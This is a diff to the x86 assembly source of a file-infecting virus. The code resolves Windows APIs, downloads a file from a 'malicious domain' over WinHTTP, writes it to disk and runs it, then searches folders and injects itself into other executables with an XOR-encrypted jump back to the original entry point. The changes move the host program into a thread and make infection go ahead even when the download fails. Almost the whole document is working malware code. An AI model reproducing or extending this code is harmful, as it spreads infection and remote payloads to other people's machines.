@@ -150,6 +150,8 @@ PointerToRawData	dd	?
 CodeSecHeader		dd	?
 
 ; DLL
+sCreateThread		db	'CreateThread', 0 
+sWaitForSingleObject	db	'WaitForSingleObject', 0 
 sIsDebuggerPresent	db	'IsDebuggerPresent', 0 
 sCreateFileMapping	db	'CreateFileMappingA', 0 
 sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
@@ -179,6 +181,8 @@ sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
 sWinHttp	db	'WINHTTP.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
+pCreateThread		dd	?
+pWaitForSingleObject	dd	?
 pIsDebuggerPresent	dd	? 
 pCreateFileMapping	dd	?
 pUnmapViewOfFile	dd	?
@@ -209,6 +213,7 @@ pFindFirstFile	dd	?
 pFindNextFile	dd	?
 
 ; OTHERS
+ThreadId	dd	?
 WUT		db	'C:\MinGW\msys\1.0\home\Shinao\Malicious\Malicious\test\notavirus.exe', 0
 Number		dd	?
 HttpSession	dd	?
@@ -321,7 +326,19 @@ GETADDR	sWinHttpReadData, pWinHttp, pWinHttpReadData
 GETADDR	sWinHttpReceiveResponse, pWinHttp, pWinHttpReceiveResponse
 GETADDR	sWinHttpCloseHandle, pWinHttp, pWinHttpCloseHandle
 GETADDR	sCreateProcess, pKernel32, pCreateProcess
+GETADDR	sCreateThread, pKernel32, pCreateThread
+GETADDR	sWaitForSingleObject, pKernel32, pWaitForSingleObject
 
+; Create Thread to avoid waiting injection & downloading
+PVDELTA	pCloseHandle
+PVDELTA	pExitProcess
+PDELTA	ThreadId
+push	0
+PVDELTA	pExitProcess
+PDELTA	threadProgram
+push	0
+push	0
+call	[DELTA pCreateThread]
 
 ; CHECK IF WE ARE BEING DEBUGGED : ABORT! ABORT!
 ; call	[DELTA pIsDebuggerPresent]
@@ -334,6 +351,8 @@ GETADDR	sCreateProcess, pKernel32, pCreateProcess
 PDELTA	LengthName
 PDELTA	ComputerName
 call	[DELTA pGetComputerName]
+cmp	eax, 0
+je	injectFiles
 push	NULL
 push	NULL
 push	NULL
@@ -402,7 +421,7 @@ push	NULL
 call	[DELTA pWinHttpOpen]
 mov	[DELTA HttpSession], eax
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 push	0
 push	0
 PDELTA	MaliciousDomain
@@ -410,7 +429,7 @@ PVDELTA	HttpSession
 call	[DELTA pWinHttpConnect]
 mov	[DELTA HttpConnect], eax
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 push	0
 push	0
 push	0
@@ -420,7 +439,7 @@ push	NULL
 PVDELTA	HttpConnect
 call	[DELTA pWinHttpOpenRequest]
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 mov	[DELTA HttpRequest], eax
 push	0
 push	0
@@ -431,12 +450,12 @@ push	0
 PVDELTA	HttpRequest
 call	[DELTA pWinHttpSendRequest]
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 push	NULL
 PVDELTA	HttpRequest
 call	[DELTA pWinHttpReceiveResponse]
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 
 ; CreateFile to download
 push	0
@@ -448,7 +467,7 @@ push	GENERIC_WRITE
 PDELTA	MaliciousFile
 call	[DELTA pCreateFile]
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 mov	[DELTA PeFile], eax
 
 ; Create malicious file downloaded
@@ -459,7 +478,7 @@ PDELTA	MaliciousUrl
 PVDELTA	HttpRequest
 call	[DELTA pWinHttpReadData]
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 push	0
 PDELTA	LengthName
 PVDELTA	Number
@@ -467,7 +486,7 @@ PDELTA	MaliciousUrl
 PVDELTA	PeFile
 call	[DELTA pWriteFile]
 cmp	eax, 0
-je	errorExit
+je	injectFiles
 mov	eax, [DELTA Number]
 cmp	eax, 70
 je	copyToFile
@@ -502,6 +521,7 @@ call	[DELTA pCreateProcess]
 
 
 ; INJECT ALL THE FILES !
+injectFiles:
 PDELTA	FileData
 PDELTA	SearchFolder
 call	[DELTA pFindFirstFile]
@@ -878,7 +898,7 @@ loop	createNewSection
 ; CREATING JUMP TO OLD ENTRY POINT
 mov	eax, [DELTA OldEntryPoint] ; Entry point address
 sub	eax, [DELTA VirtualAddress]
-mov	edi, errorExit - toInject ; Offset jmp
+mov	edi, threadProgram - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
 mov	eax, 0E9h ; JMP rel32 OPCODE
@@ -886,7 +906,7 @@ xor	eax, [DELTA XorCrypt] ; Encrypt
 stosb
 mov	eax, [DELTA OldEntryPoint] ; Entry point address
 sub	eax, [DELTA VirtualAddress]
-mov	esi, errorExit - toInject
+mov	esi, threadProgram - toInject
 sub	eax, esi
 sub	eax, 05h ; Add 5 bytes for JMP
 xor	eax, [DELTA XorCrypt] ; encrypt
@@ -972,16 +992,22 @@ cmp	eax, 0
 je	errorExit
 jmp	nextFileToInject
 
-; Jump to old entry point (Overrided when injecting)
+; Wait for thread old program and exit
 errorExit:
-mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
+PVDELTA	ThreadId
+push	INFINITE
+call	[DELTA pWaitForSingleObject]
 push	0
-call 	[DELTA pExitProcess]
+call	[DELTA pExitProcess]
 
+; Jump to old entry point (Overrided when injecting)
+threadProgram:
+pop	eax
+push	0
+call 	eax
+nop
+nop
+nop
 
 ; UTILS
 ; Random number (EAX: Max && Return Value)
